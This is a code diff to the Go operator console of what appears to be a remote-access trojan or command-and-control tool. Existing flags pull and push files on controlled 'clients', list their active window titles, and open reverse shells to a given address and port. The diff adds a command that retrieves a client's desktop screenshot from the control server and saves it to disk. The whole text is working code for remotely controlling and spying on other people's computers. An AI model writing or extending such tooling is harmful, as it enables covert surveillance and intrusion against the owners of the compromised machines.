@@ -23,6 +23,7 @@ func main() {
 	getFile := flag.Bool("getFile", false, "Get a file from a client")
 	putFile := flag.Bool("putFile", false, "Upload a file to a client")
 	createShellSession := flag.Bool("createShellSession", false, "Creates a reverse shell session")
+	getScreenshot := flag.Bool("getScreenshot", false, "Gets a screenshot")
 	shellAddress := flag.String("shellAddress", "", "Address reverse shell will connect to")
 	shellPort := flag.String("shellPort", "", "Port reverse shell will connect to")
 	clientName := flag.String("clientName", "", "Name of client to operate on")
@@ -60,6 +61,12 @@ func main() {
 			log.Error("'clientName', 'shellAddress', and 'shellPort' parameters are required for 'createShellSession' command")
 		} else {
 			doCreateShellSession(*clientName, *shellAddress, *shellPort)
+		}
+	} else if *getScreenshot {
+		if *clientName == "" {
+			log.Error("'clientName' parameter is required for 'getScreenshot' command")
+		} else {
+			doGetScreenshot(*clientName)
 		}
 	} else {
 		flag.PrintDefaults()
@@ -195,4 +202,31 @@ func doShowClients() {
 		table.Append([]string{c.Name, c.Address, c.ComputerName, c.ActiveWindowTitle})
 	}
 	table.Render()
+}
+
+func doGetScreenshot(clientName string) {
+	resp, err := http.Get("http://" + serverAddress + ":" + serverPort + "/desktop/" + clientName)
+	if err != nil {
+		log.Error(err)
+		return
+	}
+	defer resp.Body.Close()
+	body, err := ioutil.ReadAll(resp.Body)
+	if err != nil {
+		log.Error(err)
+		return
+	}
+	var response GetFileResponse
+	json.Unmarshal(body, &response)
+	decoded, err := base64.StdEncoding.DecodeString(response.File)
+	if err != nil {
+		log.Error(err)
+		return
+	}
+	os.MkdirAll("./files/"+clientName+"/screenshots", os.ModePerm)
+	err = ioutil.WriteFile("./files/"+clientName+"/screenshots/last.jpg", decoded, 0644)
+	if err != nil {
+		log.Error(err)
+		return
+	}
 }
